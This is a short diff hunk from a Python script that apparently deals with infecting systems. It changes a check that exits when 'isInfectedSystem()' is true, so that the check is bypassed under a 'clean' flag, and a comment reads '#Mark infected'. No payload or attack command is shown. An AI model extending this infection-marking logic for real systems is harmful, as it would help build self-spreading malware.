@@ -187,7 +187,7 @@ if len(sys.argv) < 3:
 			print("Invalid argument")
 			sys.exit()
 
-	if isInfectedSystem():
+	if isInfectedSystem() and not clean:
 		sys.exit()
 	else:
 		#Mark infected
